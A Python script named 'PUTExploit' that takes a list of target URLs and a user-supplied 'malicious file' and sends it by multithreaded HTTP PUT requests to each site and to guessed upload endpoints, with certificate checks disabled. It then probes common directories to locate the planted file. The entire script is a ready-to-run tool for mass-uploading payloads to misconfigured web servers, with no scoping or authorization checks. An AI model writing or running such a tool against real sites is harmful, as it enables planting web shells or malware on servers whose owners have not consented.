import requests
import os
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print("──────────────────────────────────────────────")
print("  Script name : PUTExploit ")
print("  Script by Mohammad Radmehr")
print("  Contact: Telegram = t.me/CBL_209")
print("  Cybersecurity expert with a focus on web penetration testing")
print("  vulnerability assessment, and comprehensive reporting to strengthen")
print("  the security of web-based systems.")
print("──────────────────────────────────────────────")

def get_file_from_user(prompt, valid_extension=None, max_size=None):
    while True:
        file_path = input(prompt).strip()
        if not os.path.isfile(file_path):
            print("\033[91m[Error]\033[0m File not found. Please try again.")
            continue

        if valid_extension and not file_path.endswith(valid_extension):
            print(f"\033[91m[Error]\033[0m File must have a {valid_extension} extension. Please try again.")
            continue

        if max_size and os.path.getsize(file_path) > max_size:
            print(f"\033[91m[Error]\033[0m File size must be under {max_size / (1024 * 1024):.2f} MB. Please try again.")
            continue

        return file_path

def validate_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def upload_file_to_url(url, malicious_data, timeout, retries):
    methods = [
        f"{url}",
        f"{url}/upload",
        f"{url}/files",
        f"{url}/data",
        f"{url}/uploads",
    ]

    for method in methods:
        attempt = 0
        while attempt < retries:
            try:
                response = requests.put(method, data=malicious_data, timeout=timeout, verify=False)
                if response.status_code in [200, 201, 204]:
                    print(f"\033[92m[Success]\033[0m {method} - Status: Success")
                    find_uploaded_file(method)
                    return
                else:
                    attempt += 1
                    if attempt >= retries:
                        print(f"\033[91m[Failed]\033[0m {method} - Status: Failed ({response.status_code})")
                        return

            except requests.exceptions.RequestException as e:
                attempt += 1
                if attempt >= retries:
                    print(f"\033[91m[Error]\033[0m {method} - Error: {e}")
                    return

def find_uploaded_file(base_url):
    potential_paths = [
        "uploaded_files",
        "uploads",
        "files",
        "data/uploads",
        "user_data",
        "temp/uploads",
        "storage",
        "assets/uploads",
        "public/uploads",
    ]

    for path in potential_paths:
        url = f"{base_url}/{path}"
        try:
            response = requests.get(url, timeout=5, verify=False)
            if response.status_code == 200:
                print(f"\033[94m[Path Found]\033[0m File might be accessible at: {url}")
        except requests.exceptions.RequestException:
            continue

def analyze_and_upload(urls_file, malicious_file, timeout, retries, max_threads):
    with open(urls_file, 'r') as f:
        urls = [line.strip() for line in f if line.strip() and validate_url(line.strip())]

    if not urls:
        print("\033[93m[Warning]\033[0m No valid URLs found in the file.")
        return

    with open(malicious_file, 'rb') as mf:
        malicious_data = mf.read()

    start_time = time.time()

    def process_url(url):
        upload_file_to_url(url, malicious_data, timeout, retries)

    try:
        with ThreadPoolExecutor(max_threads) as executor:
            executor.map(process_url, urls)

        end_time = time.time()
        print("\n\033[92m[Completed]\033[0m Testing completed in {:.2f} seconds.".format(end_time - start_time))
    except KeyboardInterrupt:
        print("\n\033[91m[Error]\033[0m Test interrupted by user.")

def main():
    urls_file = get_file_from_user("Enter the path to the .txt file containing URLs: ", valid_extension=".txt")
    malicious_file = get_file_from_user("Enter the path to the malicious file: ", max_size=1 * 1024 * 1024)
    timeout = int(input("Enter the timeout in seconds (default 10): ") or 10)
    retries = int(input("Enter the number of retry attempts (default 3): ") or 3)
    max_threads = int(input("Enter the number of threads (default 5): ") or 5)

    analyze_and_upload(urls_file, malicious_file, timeout, retries, max_threads)

if __name__ == "__main__":
    main()
